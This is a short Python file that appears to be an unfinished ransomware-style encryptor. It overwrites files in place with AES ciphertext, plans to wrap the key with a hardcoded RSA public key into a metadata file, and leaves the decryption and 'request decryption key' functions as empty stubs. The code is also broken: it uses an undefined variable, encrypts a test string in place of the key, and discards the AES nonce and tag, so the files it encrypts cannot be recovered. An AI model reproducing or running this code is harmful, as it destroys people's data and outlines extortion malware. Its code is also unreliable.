from Cryptodome.Cipher import AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5 as Cipher_PKCS1_v1_5
from base64 import b64decode, b64encode
from utils import *
import os
import utils


def encryptFile(filename, symmetric_key):
    cipher = AES.new(symmetric_key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(utils.getFileByteArray(filename))
    with open(filename, 'wb') as f:
        f.write(ciphertext)
    return


def generateSymmKey(bits=16):
    random_key = os.urandom(bits)
    return random_key


def requestDecryptionKey(filename):
    return


def decryptFile(filename, symmetric_key):
    return


def encryptSymmInMetadata(filename, symmetric_key, puk):
    # remove this line when actual puk is sent
    puk = """-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBA3UAA4GNADCBiQKBgQC35eMaYoJXEoJt5HxarHkzDBEMU3qIWE0HSQ77CwP/8UbX07W2XKwngUyY4k6Hl2M/n9TOZMZsiBzer/fqV+QNPN1m9M94eUm2gQgwkoRj5battRCaNJK/23GGpCsTQatJN8PZBhJBb2Vlsvw5lFrSdMT1R7vaz+2EeNR/FitFXwIDAQAB
-----END PUBLIC KEY-----"""

    msg = "test"
    print(puk)
    keyPub = RSA.importKey(puk)
    cipher = Cipher_PKCS1_v1_5.new(keyPub)
    emsg = cipher.encrypt(msg.encode())
    print(emsg)

    parts = filename.split("/")
    base = '/'.join(parts[:-1])
    metadataFile = base + "/metadata." + parts[-1]
    print("[ENC] Created metadata file")
    with open(metadataFile, 'wb') as f:
        f.write(cipher_text)
